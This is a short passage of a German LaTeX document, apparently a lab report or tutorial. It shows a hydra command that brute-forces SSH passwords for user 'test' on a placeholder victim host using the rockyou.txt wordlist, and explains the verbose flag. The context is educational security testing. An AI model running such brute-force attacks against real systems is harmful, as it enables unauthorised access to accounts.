...
{\setstretch{1.0}
\begin{Verbatim}[frame=single]
   hydra -l test -P rockyou.txt [Opfersystem1] ssh -V -t 4
   ...
   -V: Ausgabe ausführlicher Information über die Durchführungen, wie 
   Versuche, Fehlermeldungen und Erfolge
